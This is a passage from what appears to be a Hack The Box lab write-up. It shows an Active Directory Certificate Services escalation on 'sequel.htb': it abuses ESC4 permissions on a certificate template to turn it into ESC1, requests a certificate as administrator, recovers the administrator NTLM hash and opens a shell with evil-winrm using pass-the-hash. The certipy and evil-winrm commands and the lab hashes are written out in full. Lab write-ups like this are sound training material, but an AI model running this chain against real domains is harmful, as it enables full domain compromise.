    Certificate Validity Start          : 2024-06-08 16:50:40+00:00                                                                     
    Certificate Validity End            : 2124-06-08 17:00:40+00:00                                                                     
    Web Enrollment                                                                                                                      
      HTTP                                                                                                                              
        Enabled                         : False 
      HTTPS                                                                                                              14:19 [30/1679]
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-07-01T18:17:28+00:00
    Template Last Modified              : 2026-07-01T18:17:28+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

It is vulnerable to `ESC4` Privilege escalation 
Template name is `DunderMifflinAuthentication`

### Modifying template

I am making the template vulnerable to `ESC1` now, by using `-write-default-configuration` flag, which by-default, makes it vulnerable to `ESC1`

```
certipy-ad template -dc-ip 10.129.4.127 -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthent
ication -write-default-configuration
```

Running the `certipy find` command will confirm that the template is indeed vulnerable now to ESC1 authentication

### Requesting a certificate from CA

We can now request a certificate from Certificate Authority

```
certipy-ad req -ca sequel-DC01-CA -dc-ip 10.129.4.127 -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuth
entication -target DC01.sequel.htb -upn administrator@sequel.htb
```

This gives a file named `administrator.pfx`

### Authenticating with the PFX file

```
certipy-ad auth pfx administrator.pfx -dc-ip 10.129.4.127
```

This gives us the administrator hash, which is `7a8d4e04986afa8ed4060f75e5a0b3ff`

### Post Exploitation

This hash can be used with `evil-winrm`, `psexec` and other tools to get a reverse shell

```
evil-winrm -i dc01.sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

We get a shell as administrator and the flag is in `C:\Users\Administrator\Desktop`

